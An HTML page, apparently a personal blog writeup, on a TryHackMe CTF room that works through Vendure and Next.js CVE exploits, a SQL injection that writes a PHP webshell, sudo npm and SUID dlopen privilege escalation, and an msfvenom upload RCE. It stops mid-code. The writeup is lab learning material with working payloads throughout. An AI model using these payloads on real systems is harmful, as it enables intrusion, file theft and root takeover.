@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; img-src 'self' data: https:; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; connect-src 'self'; frame-src 'none'; upgrade-insecure-requests">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Writeup · TryHackMe Dehli Meetup CTF · Pushpender Singh Rathore</title>
+    <meta name="description" content="Writeup for the TryHackMe Dehli Meetup CTF run at the TryHackMe x EHAX DTU workshop (2026-10-13). Covers Web, Networking, Boot2Root, LLM and Coding tracks across 11 tasks.">
+    <meta name="keywords" content="TryHackMe, Dehli Meetup, CTF, writeup, EHAX, DTU, Delhi Technological University, Vendure CVE-2024-56357, Next.js CVE-2025-29927, MySQL SQLi, SUID dlopen hijack, npm GTFOBins, Pushpender Singh Rathore">
+    <meta name="author" content="Pushpender Singh Rathore">
+    <link rel="canonical" href="https://pushpenderrathore.github.io/writeups/thm-dehli-meetup.html">
+
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Writeup · TryHackMe Dehli Meetup CTF">
+    <meta property="og:description" content="How the TryHackMe Dehli Meetup CTF (11 tasks, Web / Networking / Boot2Root / LLM / Coding) solved end to end at the TryHackMe x EHAX DTU workshop.">
+    <meta property="og:image" content="../images/img.jpg">
+    <meta property="og:url" content="https://pushpenderrathore.github.io/writeups/thm-dehli-meetup.html">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9A%A9%3C/text%3E%3C/svg%3E">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+
+    <style>
+        /* Hero */
+        .wu-hero { padding-top: 9rem; padding-bottom: 3.5rem; }
+        .wu-eyebrow {
+            display: inline-flex; align-items: center; gap: 0.5rem;
+            font-size: 0.78rem; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 0.18em;
+            color: var(--accent-primary);
+            background: var(--border-accent);
+            padding: 0.55rem 1.1rem;
+            border-radius: var(--border-radius-pill);
+            border: 1px solid var(--border-accent);
+            margin-bottom: 1.5rem;
+        }
+        .wu-hero h1 {
+            font-size: clamp(2.2rem, 5.5vw, 4rem);
+            font-weight: 800; line-height: 1.1; margin-bottom: 1.2rem;
+        }
+        .wu-hero .subtitle {
+            font-size: 1.25rem; color: var(--text-secondary);
+            font-weight: 500; margin-bottom: 1.75rem;
+        }
+        .wu-hero .hero-desc { max-width: 820px; margin-bottom: 2rem; }
+        .wu-meta {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+            gap: 0.9rem; max-width: 960px; margin-bottom: 2rem;
+        }
+        .wu-meta-item {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--border-radius);
+            padding: 1rem 1.15rem;
+        }
+        .wu-meta-item .meta-label {
+            font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.14em;
+            color: var(--text-muted); display: block; margin-bottom: 0.4rem;
+        }
+        .wu-meta-item .meta-value {
+            font-size: 1rem; font-weight: 600; color: var(--text-primary);
+        }
+
+        /* Scope note */
+        .scope-note {
+            background: var(--glass-bg);
+            border: 1px solid var(--border-accent);
+            border-left: 3px solid var(--accent-primary);
+            border-radius: var(--border-radius);
+            padding: 1rem 1.2rem;
+            margin-bottom: 2.5rem;
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            max-width: 820px;
+        }
+        .scope-note strong { color: var(--text-primary); }
+
+        /* Table of contents */
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 0.85rem;
+            margin: 1.5rem 0 2rem;
+        }
+        .toc-item {
+            display: flex; align-items: flex-start; gap: 0.75rem;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            padding: 0.75rem 0.9rem;
+            text-decoration: none;
+            transition: all 0.18s ease;
+        }
+        .toc-item:hover {
+            border-color: var(--border-accent);
+            transform: translateY(-1px);
+        }
+        .toc-item .toc-num {
+            font-family: var(--font-mono);
+            font-size: 0.75rem; font-weight: 700;
+            color: var(--accent-primary);
+            min-width: 2.4rem;
+            padding-top: 0.1rem;
+        }
+        .toc-item .toc-body { flex: 1; min-width: 0; }
+        .toc-item .toc-name {
+            display: block; font-weight: 600;
+            color: var(--text-primary); font-size: 0.95rem;
+            margin-bottom: 0.15rem;
+        }
+        .toc-item .toc-meta {
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--text-muted);
+        }
+        .toc-item.pending .toc-name { color: var(--text-secondary); }
+
+        /* Category badges */
+        .cat {
+            display: inline-block;
+            font-family: var(--font-mono);
+            font-size: 0.68rem; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 0.12em;
+            padding: 0.25rem 0.6rem;
+            border-radius: var(--border-radius-pill);
+            vertical-align: middle;
+            margin-right: 0.6rem;
+        }
+        .cat-web { background: rgba(255, 180, 0, 0.14); color: #ffb400; border: 1px solid rgba(255, 180, 0, 0.3); }
+        .cat-net { background: rgba(0, 212, 255, 0.14); color: #00d4ff; border: 1px solid rgba(0, 212, 255, 0.3); }
+        .cat-b2r { background: rgba(255, 94, 127, 0.14); color: #ff5e7f; border: 1px solid rgba(255, 94, 127, 0.3); }
+        .cat-llm { background: rgba(159, 239, 0, 0.14); color: var(--accent-primary); border: 1px solid var(--border-accent); }
+        .cat-code { background: rgba(176, 142, 255, 0.14); color: #b08eff; border: 1px solid rgba(176, 142, 255, 0.3); }
+        .cat-intro { background: rgba(139, 151, 166, 0.14); color: var(--text-secondary); border: 1px solid var(--glass-border); }
+
+        /* Status pill */
+        .status {
+            display: inline-block;
+            font-family: var(--font-mono);
+            font-size: 0.68rem; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 0.12em;
+            padding: 0.22rem 0.55rem;
+            border-radius: 6px;
+            margin-left: 0.4rem;
+        }
+        .status-done { background: rgba(159, 239, 0, 0.12); color: var(--accent-primary); border: 1px solid var(--border-accent); }
+        .status-todo { background: rgba(139, 151, 166, 0.1); color: var(--text-muted); border: 1px dashed var(--glass-border); }
+
+        /* Task card */
+        .task {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--border-radius);
+            padding: 1.75rem 1.85rem;
+            margin-bottom: 1.5rem;
+            scroll-margin-top: 90px;
+        }
+        .task-head {
+            display: flex; align-items: center; flex-wrap: wrap;
+            gap: 0.4rem; margin-bottom: 0.4rem;
+        }
+        .task h3 {
+            font-size: 1.5rem; font-weight: 700;
+            color: var(--text-primary); margin: 0;
+            display: inline-block;
+        }
+        .task .task-num {
+            font-family: var(--font-mono);
+            font-size: 0.85rem; font-weight: 700;
+            color: var(--text-muted);
+            margin-right: 0.6rem;
+        }
+        .task .box-ip {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            margin-bottom: 1.1rem;
+            display: block;
+        }
+        .task h4 {
+            font-size: 1.05rem; font-weight: 600;
+            color: var(--accent-primary);
+            margin: 1.4rem 0 0.7rem;
+        }
+        .task p { color: var(--text-secondary); line-height: 1.7; margin-bottom: 0.9rem; }
+        .task p strong { color: var(--text-primary); font-weight: 600; }
+        .task ul, .task ol {
+            color: var(--text-secondary); line-height: 1.75;
+            padding-left: 1.4rem; margin-bottom: 1rem;
+        }
+        .task li { margin-bottom: 0.3rem; }
+        .task code {
+            font-family: var(--font-mono);
+            font-size: 0.85em;
+            background: rgba(159, 239, 0, 0.08);
+            color: var(--accent-primary);
+            padding: 0.12em 0.42em;
+            border-radius: 4px;
+            border: 1px solid var(--border-accent);
+        }
+        .task pre {
+            background: var(--bg-primary);
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            padding: 1rem 1.1rem;
+            overflow-x: auto;
+            margin: 0.8rem 0 1.2rem;
+            font-size: 0.82rem;
+            line-height: 1.55;
+        }
+        .task pre code {
+            background: transparent;
+            border: none;
+            padding: 0;
+            color: var(--text-primary);
+            font-size: inherit;
+        }
+        .task .pending-note {
+            background: rgba(139, 151, 166, 0.06);
+            border: 1px dashed var(--glass-border);
+            border-radius: 10px;
+            padding: 1rem 1.15rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            font-style: italic;
+        }
+        .task .redacted {
+            font-family: var(--font-mono);
+            font-size: 0.82rem;
+            background: rgba(255, 94, 127, 0.08);
+            border: 1px dashed rgba(255, 94, 127, 0.3);
+            color: #ff5e7f;
+            padding: 0.1em 0.5em;
+            border-radius: 4px;
+        }
+        .takeaway {
+            background: rgba(159, 239, 0, 0.05);
+            border-left: 3px solid var(--accent-primary);
+            border-radius: 8px;
+            padding: 0.9rem 1.1rem;
+            margin: 1rem 0 0.4rem;
+            font-size: 0.92rem;
+        }
+        .takeaway strong { color: var(--accent-primary); }
+
+        .wu-cta {
+            display: inline-flex; align-items: center; gap: 0.5rem;
+            background: var(--accent-gradient);
+            color: var(--bg-primary);
+            font-weight: 700;
+            padding: 0.7rem 1.3rem;
+            border-radius: var(--border-radius-pill);
+            text-decoration: none;
+            transition: filter 0.15s;
+        }
+        .wu-cta:hover { filter: brightness(1.1); }
+
+        .footer-note {
+            color: var(--text-muted);
+            font-size: 0.88rem;
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid var(--glass-border);
+        }
+        .footer-note a { color: var(--accent-secondary); }
+
+        @media (max-width: 768px) {
+            .task { padding: 1.2rem 1.3rem; }
+            .task pre { font-size: 0.75rem; padding: 0.8rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-fx" aria-hidden="true">
+        <div class="bg-grid"></div>
+        <div class="bg-orb bg-orb--green"></div>
+        <div class="bg-orb bg-orb--cyan"></div>
+        <div class="bg-noise"></div>
+    </div>
+
+    <header>
+        <nav class="navbar">
+            <div class="nav-brand"><span class="brand-prompt">~/</span>solitude_coder<span class="brand-cursor">_</span></div>
+            <ul class="nav-menu">
+                <li><a href="../index.html" class="nav-link">Portfolio</a></li>
+                <li><a href="../prs.html" class="nav-link">Pull Requests</a></li>
+                <li><a href="../gsoc.html" class="nav-link">GSoC</a></li>
+                <li><a href="#tasks" class="nav-link">Tasks</a></li>
+                <li><a href="../gsoc.html#blog" class="nav-link">Blog</a></li>
+            </ul>
+            <div class="nav-cta">
+                <a href="../index.html" class="cta-btn">Back to Portfolio</a>
+            </div>
+            <div class="hamburger"><span></span><span></span><span></span></div>
+        </nav>
+    </header>
+
+    <main>
+        <section class="section wu-hero">
+            <div class="container">
+                <span class="wu-eyebrow">
+                    <i class="fas fa-flag"></i> TryHackMe Writeup &middot; Room 100%
+                </span>
+                <h1>Dehli Meetup CTF <span class="accent">Writeup</span></h1>
+                <p class="subtitle">TryHackMe x EHAX workshop at DTU &middot; 2026-10-13</p>
+                <p class="hero-desc">
+                    The TryHackMe x EHAX hands-on workshop at Delhi Technological University closed on the live <strong>Dehli Meetup</strong> room: eleven tasks, 106 points, a 60-minute timer, 208 players, one AttackBox per task. This writeup walks the four tasks I solved end to end during and after the session. The remaining tasks have placeholders waiting for their own writeups.
+                </p>
+
+                <div class="wu-meta">
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Event</span>
+                        <span class="meta-value">TryHackMe &times; EHAX</span>
+                    </div>
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Venue</span>
+                        <span class="meta-value">BR Ambedkar Auditorium, DTU</span>
+                    </div>
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Room</span>
+                        <span class="meta-value">Dehli Meetup &middot; 11 tasks</span>
+                    </div>
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Tracks</span>
+                        <span class="meta-value">Web / Net / B2R / LLM / Coding</span>
+                    </div>
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Points</span>
+                        <span class="meta-value">106 / 106</span>
+                    </div>
+                    <div class="wu-meta-item">
+                        <span class="meta-label">Date</span>
+                        <span class="meta-value">13 Oct 2026</span>
+                    </div>
+                </div>
+
+                <div class="hero-actions">
+                    <a class="wu-cta" href="https://tryhackme.com/room/dehlimeetup" target="_blank" rel="noopener noreferrer">
+                        <i class="fas fa-external-link-alt"></i>
+                        <span>Open the room on TryHackMe</span>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" id="scope">
+            <div class="container">
+                <div class="scope-note">
+                    <strong>Scope and ethics.</strong> This writeup follows TryHackMe's publication rules: <strong>no literal flag strings, cracked hashes or credentials</strong> are included in the page. Techniques, payloads, and root-cause reasoning are. Four tasks (<a href="#task-2">2 Asset Server</a>, <a href="#task-3">3 Gatepass</a>, <a href="#task-6">6 Sequel</a>, <a href="#task-7">7 Malscan</a>) are covered end to end. The remaining seven are placeholders that will be filled in a follow-up.
+                </div>
+
+                <h2 class="section-title">Tasks</h2>
+                <p class="section-intro">Jump to any task. Status reflects writeup completion, not solve state (the room itself is 100%).</p>
+
+                <div class="toc-grid" id="tasks">
+                    <a class="toc-item" href="#task-1">
+                        <span class="toc-num">01</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Introduction</span>
+                            <span class="toc-meta">intro &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item" href="#task-2">
+                        <span class="toc-num">02</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Asset Server</span>
+                            <span class="toc-meta">web &middot; 60 pts &middot; <span class="status status-done">covered</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item" href="#task-3">
+                        <span class="toc-num">03</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Gatepass</span>
+                            <span class="toc-meta">web &middot; <span class="status status-done">covered</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-4">
+                        <span class="toc-num">04</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Bastion Hop</span>
+                            <span class="toc-meta">networking &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-5">
+                        <span class="toc-num">05</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Stolen Footprints</span>
+                            <span class="toc-meta">networking &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item" href="#task-6">
+                        <span class="toc-num">06</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Sequel</span>
+                            <span class="toc-meta">boot2root &middot; 30 pts &middot; <span class="status status-done">covered</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item" href="#task-7">
+                        <span class="toc-num">07</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Malscan</span>
+                            <span class="toc-meta">boot2root &middot; 60 pts &middot; <span class="status status-done">covered</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-8">
+                        <span class="toc-num">08</span>
+                        <span class="toc-body">
+                            <span class="toc-name">HelloGPT</span>
+                            <span class="toc-meta">llm &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-9">
+                        <span class="toc-num">09</span>
+                        <span class="toc-body">
+                            <span class="toc-name">BankGPT</span>
+                            <span class="toc-meta">llm &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-10">
+                        <span class="toc-num">10</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Math Wiz</span>
+                            <span class="toc-meta">coding &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                    <a class="toc-item pending" href="#task-11">
+                        <span class="toc-num">11</span>
+                        <span class="toc-body">
+                            <span class="toc-name">Exposed</span>
+                            <span class="toc-meta">coding &middot; <span class="status status-todo">pending</span></span>
+                        </span>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="container">
+
+                <!-- ============= TASK 1 ============= -->
+                <article class="task" id="task-1">
+                    <div class="task-head">
+                        <span class="task-num">Task 01</span>
+                        <span class="cat cat-intro">Intro</span>
+                        <h3>Introduction</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill this task from your own notes -->
+                    <div class="pending-note">Writeup pending. The room intro covers the AttackBox launch and competition framing; no attack surface here.</div>
+                </article>
+
+                <!-- ============= TASK 2 ============= -->
+                <article class="task" id="task-2">
+                    <div class="task-head">
+                        <span class="task-num">Task 02 &middot; 60 pts</span>
+                        <span class="cat cat-web">Web</span>
+                        <h3>Asset Server</h3>
+                    </div>
+
+                    <h4>The target</h4>
+                    <p>A storefront built on Vendure 3.0.4 (headless e-commerce). An Express frontend on port 80 reverse-proxies <code>/assets/*</code> to a Vendure instance on port 3001 via <code>http-proxy-middleware</code>. The flag lives at <code>/flag.txt</code> on the Vendure container, one directory above its asset root.</p>
+
+                    <h4>The bug</h4>
+                    <p>Vendure 3.0.4 ships the <code>@vendure/asset-server-plugin</code> that is vulnerable to <strong>CVE-2024-56357</strong> &mdash; a path-traversal in the asset handler. The handler joins the request path onto its configured asset root but normalises after decoding, so URL-encoded <code>../</code> sequences escape the root unchecked.</p>
+
+                    <h4>The request</h4>
+                    <pre><code>GET /assets/..%2F..%2Fflag.txt HTTP/1.1
+Host: TARGET_IP</code></pre>
+                    <p>Encoding notes that matter during the solve:</p>
+                    <ul>
+                        <li><code>..%2F</code> and <code>%2e%2e%2f</code> both work.</li>
+                        <li>A literal <code>../</code> gets collapsed by the Express proxy layer before Vendure sees it, so plain traversal fails.</li>
+                        <li>Point the request at the Express port (80), not the Vendure backend; the backend may not even be reachable from outside.</li>
+                    </ul>
+
+                    <h4>Why it works</h4>
+                    <p>Inside the asset-server plugin, the path is joined to the asset root <em>after</em> URL-decoding. By the time the normaliser runs, the <code>..</code> components are already in a fully-formed OS path and resolve upward. The Express proxy layer refuses literal <code>../</code>, which is why the encoded form is the one that lands.</p>
+
+                    <div class="takeaway"><strong>Takeaway.</strong> Encoding bypasses survive at trust boundaries. The proxy in front of Vendure sanitises what it can parse; what it can't parse (percent-encoded path segments) rides straight through to a sink that decodes <em>then</em> joins.</div>
+
+                    <p><strong>Flag format:</strong> <code>THM{REDACTED}</code> &mdash; actual value <span class="redacted">redacted per TryHackMe policy</span>.</p>
+                </article>
+
+                <!-- ============= TASK 3 ============= -->
+                <article class="task" id="task-3">
+                    <div class="task-head">
+                        <span class="task-num">Task 03</span>
+                        <span class="cat cat-web">Web</span>
+                        <h3>Gatepass</h3>
+                    </div>
+
+                    <h4>The target</h4>
+                    <p>A Next.js 14.1.1 app with middleware that gates <code>/api/*</code> behind an auth check. The route <code>/api/file?path=…</code> reads a file and returns its contents, but only once the middleware is satisfied.</p>
+
+                    <h4>The bug</h4>
+                    <p><strong>CVE-2025-29927</strong> &mdash; the Next.js middleware subrequest bypass. Next.js uses the internal header <code>x-middleware-subrequest</code> to flag requests that originated from within the middleware itself (to avoid re-running the chain on a redirect). The flag is honoured when it arrives from an untrusted client too, so attaching the header skips the middleware entirely.</p>
+
+                    <h4>The request</h4>
+                    <pre><code>GET /api/file?path=/flag.txt HTTP/1.1
+Host: TARGET_IP
+x-middleware-subrequest: middleware</code></pre>
+                    <p>Variants worth knowing:</p>
+                    <ul>
+                        <li>Nested value &mdash; <code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code> &mdash; also lands, which is relevant when the app uses nested middleware chains.</li>
+                        <li>The file handler blocks <code>..</code> but accepts absolute paths. <code>/flag.txt</code> is absolute and clean, so the second-stage filter never fires.</li>
+                    </ul>
+
+                    <h4>Why it works</h4>
+                    <p>Next.js tracks middleware recursion by writing <code>x-middleware-subrequest</code> on internal fetches and short-circuiting the middleware chain when it reads the header back. The fix in later versions scopes the header to internal invocations only; the vulnerable version trusts anyone who sets it. Combined with a route handler that only guards against relative traversal, the result is unauthenticated arbitrary file read.</p>
+
+                    <div class="takeaway"><strong>Takeaway.</strong> Framework-internal headers are not a security boundary unless the framework explicitly strips them from inbound requests. When you have middleware doing auth, the first thing to check is whether it can be told it has already run.</div>
+
+                    <p><strong>Flag format:</strong> <code>THM{REDACTED}</code> &mdash; actual value <span class="redacted">redacted per TryHackMe policy</span>.</p>
+                </article>
+
+                <!-- ============= TASK 4 ============= -->
+                <article class="task" id="task-4">
+                    <div class="task-head">
+                        <span class="task-num">Task 04</span>
+                        <span class="cat cat-net">Networking</span>
+                        <h3>Bastion Hop</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
+                    <div class="pending-note">Writeup pending. Requires the Europe (Ireland) AttackBox region; add solve path, pivot/bastion details and the resource you ultimately reached.</div>
+                </article>
+
+                <!-- ============= TASK 5 ============= -->
+                <article class="task" id="task-5">
+                    <div class="task-head">
+                        <span class="task-num">Task 05</span>
+                        <span class="cat cat-net">Networking</span>
+                        <h3>Stolen Footprints</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. -->
+                    <div class="pending-note">Writeup pending. Add the pcap/traffic analysis path and the artefact(s) that produced the flag.</div>
+                </article>
+
+                <!-- ============= TASK 6 ============= -->
+                <article class="task" id="task-6">
+                    <div class="task-head">
+                        <span class="task-num">Task 06 &middot; 30 pts</span>
+                        <span class="cat cat-b2r">Boot2Root</span>
+                        <h3>Sequel</h3>
+                    </div>
+                    <span class="box-ip">Target: HomeTel (Next.js on :3000, Apache on :80, SSH on :22) &middot; three flags: web, user, root</span>
+
+                    <h4>Recon</h4>
+                    <p>Only three TCP ports open: 22, 80, 3000. Port 80 serves an Apache dir listing with an empty <code>/api/bill/</code> folder and a phpMyAdmin 4.9.5 install (login-gated). Port 3000 is a Next.js dev build called <strong>HomeTel</strong>. The dev bundle leaks source paths like <code>/home/ubuntu/csportal/src/pages/{login,home}/index.js</code> and the API endpoints <code>/api/login</code>, <code>/api/bill</code> and <code>/api/logout</code>.</p>
+
+                    <h4>Web flag &mdash; SQL injection in /api/bill</h4>
+                    <p>The home page's bill-lookup form POSTs <code>{"NumReference": "&lt;n&gt;"}</code> to <code>/api/bill</code>. The parameter is interpolated into a numeric SQL expression without quotes or parameterisation, so no quote escape is needed:</p>
+                    <pre><code>POST /api/bill
+{"NumReference":"0 UNION SELECT 1,2,3"}
+=&gt; 3-column shape confirmed: Nreference, price, tax
+
+{"NumReference":"0 UNION SELECT version(),2,3"}
+=&gt; 8.0.36-0ubuntu0.20.04.1
+
+{"NumReference":"0 UNION SELECT current_user(),database(),3"}
+=&gt; root@localhost, bill_app_db
+
+{"NumReference":"0 UNION SELECT GROUP_CONCAT(table_name),2,3
+                FROM information_schema.tables
+                WHERE table_schema=database()"}
+=&gt; bill, flag, users
+
+{"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
+=&gt; web flag text</code></pre>
+
+                    <p>Side note on the login endpoint: <code>POST /api/login</code> returns the matching user row, but a classic <code>' OR '1'='1</code> hits an explicit "only guest login is allowed" branch that rejects multi-row responses. The bill endpoint is the real sink.</p>
+
+                    <h4>User flag &mdash; MySQL FILE &rarr; PHP webshell</h4>
+                    <p>The DB session is <code>root@localhost</code>, has <code>FILE</code> privilege, and <code>@@secure_file_priv</code> is empty. <code>LOAD_FILE</code> is restricted by AppArmor &mdash; <code>/etc/passwd</code> and <code>/etc/mysql/my.cnf</code> return content, but <code>/etc/ssh/sshd_config</code>, <code>/home/*</code> and <code>/proc/mounts</code> all return NULL &mdash; so direct file disclosure is a dead end. Writes to <code>/var/www/html/</code> are allowed, however, which is enough:</p>
+                    <pre><code>POST /api/bill
+{"NumReference":"0 UNION SELECT UNHEX('3c3f70687020...'),2,3
+                INTO OUTFILE '/var/www/html/pwn.php'"}</code></pre>
+                    <p>The payload hex-encodes <code>&lt;?php system($_GET["c"]); ?&gt;</code>. The API response reads <em>"User not found"</em> because the UNION returned zero data rows, but the file still lands on disk. Confirm:</p>
+                    <pre><code>GET /pwn.php?c=id
+=&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data),119(mysql)</code></pre>
+                    <p>From there, <code>find / -name user.txt 2&gt;/dev/null</code> surfaces <code>/var/www/user.txt</code> (owned by www-data, mode 644). The <code>.env</code> at <code>/home/ubuntu/csportal/.env</code> also leaks <code>MYSQL_PASSWORD=root@123</code> for the phpMyAdmin path if you want it.</p>
+
+                    <h4>Root flag &mdash; sudo npm, done right for modern npm</h4>
+                    <p><code>sudo -l</code> as www-data returns:</p>
+                    <pre><code>(root) NOPASSWD: /usr/bin/npm *</code></pre>
+                    <p>The classic GTFOBins payload (<code>preinstall</code> script in a crafted <code>package.json</code>) <strong>does not work on npm 8+</strong>. The npm wrapper deliberately drops privileges on lifecycle scripts to the directory owner (here, www-data), even with <code>--unsafe-perm</code>. Confirmed with a probe: <code>id</code> inside <code>preinstall</code> returned <code>uid=33(www-data)</code>, not root.</p>
+
+                    <p>The reliable escape on npm 8/9/10 is the <code>init-module</code> userconfig trick. npm itself <code>require()</code>s the file named by <code>init-module</code> inside the <em>npm process</em> (which is still root), before any lifecycle isolation runs:</p>
+                    <pre><code>echo 'init-module=/tmp/init.js' &gt; /tmp/.npmrc
+
+cat &gt; /tmp/init.js &lt;&lt;'EOF'
+require("child_process").execSync(
+    "cat /root/root.txt &gt; /tmp/rf; chmod 666 /tmp/rf"
+);
+process.exit(0);
+EOF
+
+sudo npm init -y --userconfig=/tmp/.npmrc --prefix=/tmp/foo
+cat /tmp/rf</code></pre>
+
+                    <div class="takeaway"><strong>Takeaway.</strong> The two things worth filing for next time: <em>INTO OUTFILE lands even when the HTTP response says "User not found"</em>, because the write happens at parse/execute time, not row-return time; and <em>GTFOBins' default npm entry is misleading on npm 8+</em>, where <code>init-module</code> is the reliable route.</div>
+
+                    <p><strong>Flag formats:</strong> web <code>THM{REDACTED}</code>, user <code>THM{REDACTED}</code>, root <code>THM{REDACTED}</code> &mdash; actual values <span class="redacted">redacted per TryHackMe policy</span>.</p>
+                </article>
+
+                <!-- ============= TASK 7 ============= -->
+                <article class="task" id="task-7">
+                    <div class="task-head">
+                        <span class="task-num">Task 07 &middot; 60 pts</span>
+                        <span class="cat cat-b2r">Boot2Root</span>
+                        <h3>Malscan</h3>
+                    </div>
+                    <span class="box-ip">Target: MalScan Labs sandbox (Apache on :80, SSH on :22) &middot; two flags: user, root</span>
+
+                    <h4>Recon</h4>
+                    <p>Only 22 and 80 open. <code>/</code> is a static "Site Under Construction" page. A directory probe finds <code>/dev/</code> (301 redirect), a working MalScan Labs frontend with <code>upload.php</code>, <code>about.php</code>, <code>contact.php</code> and a readable <code>assets/</code> listing.</p>
+
+                    <h4>Initial RCE &mdash; the sandbox is not a sandbox</h4>
+                    <p><code>/dev/upload.php</code> accepts a multipart POST, performs an ELF magic-byte check (text files are rejected with <em>"Error: File is not a binary."</em>), runs the uploaded file as www-data, and renders its stdout under <em>"Execution Output:"</em>. A YARA scan runs ahead of execution but doesn't block a plain shellcode payload.</p>
+                    <p>msfvenom gives you a tight ELF whose only job is to run a shell command and let its stdout surface in the response:</p>
+                    <pre><code>msfvenom -p linux/x64/exec \
+    CMD='id; uname -a; find / -name user.txt 2&gt;/dev/null; ls -la /home' \
+    -f elf -o /tmp/mal
+
+curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"</code></pre>
+                    <p>Key leaks from the first probe:</p>
+                    <ul>
+                        <li><code>uid=33(www-data)</code>, hostname <code>tryhackme-2404</code> (Ubuntu 24.04).</li>
+                        <li>Two home directories: <code>/home/agent</code> and <code>/home/ubuntu</code>, both unreadable to www-data.</li>
+                        <li>The user flag isn't under <code>/home/*</code> &mdash; it's at <strong><code>/opt/user.txt</code></strong> (world-readable).</li>
+                    </ul>
+
+                    <h4>SUID binary analysis &mdash; /opt/agent/scanner</h4>
+                    <p><code>find / -perm -4000</code> surfaces an unusual SUID binary: <code>/opt/agent/scanner</code> (root, mode 4755), sitting inside <code>/opt/agent</code> which is world-writable (<code>drwxrwxrwx</code>). Exfil it (via a base64 CMD payload), run <code>objdump -d</code>, and the control flow is textbook library-hijack bait:</p>
+                    <pre><code>// Pseudocode of main()
+char buf[0x200];
+readlink("/proc/self/exe", buf, 0x1ff);          // "/opt/agent/scanner"
+
+char path[0x200];
+snprintf(path, 0x200, "%s/libscan.so", dirname(buf));
+                                                 // "/opt/agent/libscan.so"
+
+void *h = dlopen(path, RTLD_NOW);
+void (*fn)(void) = dlsym(h, "run");
+fn();</code></pre>
+                    <p>No <code>libscan.so</code> ships in <code>/opt/agent/</code> &mdash; a plain run of the scanner prints <code>dlopen error: ... No such file or directory</code>. Combine that with world-writable <code>/opt/agent/</code> and the SUID bit: whoever drops <code>/opt/agent/libscan.so</code> gets code execution as root the next time the scanner runs.</p>
+
+                    <h4>Building the payload library on target</h4>
+                    <p>The library is trivial. A constructor is enough; <code>RTLD_NOW</code> fires it inside <code>dlopen</code>, well before <code>dlsym("run")</code> would even return:</p>
+                    <pre><code>// /tmp/libscan.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void run(void) {
+    setuid(0);
